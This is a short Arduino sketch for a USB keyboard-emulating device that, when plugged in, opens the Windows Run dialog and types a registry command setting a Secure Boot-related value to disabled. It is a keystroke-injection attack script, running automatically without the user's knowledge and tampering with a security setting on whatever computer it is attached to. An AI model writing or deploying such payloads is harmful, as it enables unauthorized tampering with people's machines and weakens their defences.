#include <USBHIDKeyboard.h>
USBHIDKeyboard Keyboard;

void setup() {
  Keyboard.begin();
  delay(3000);
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  
  Keyboard.println(F("reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecureBoot\" /v UEFISecureBootEnabled /t REG_DWORD /d 0 /f"));
}

void loop() {}
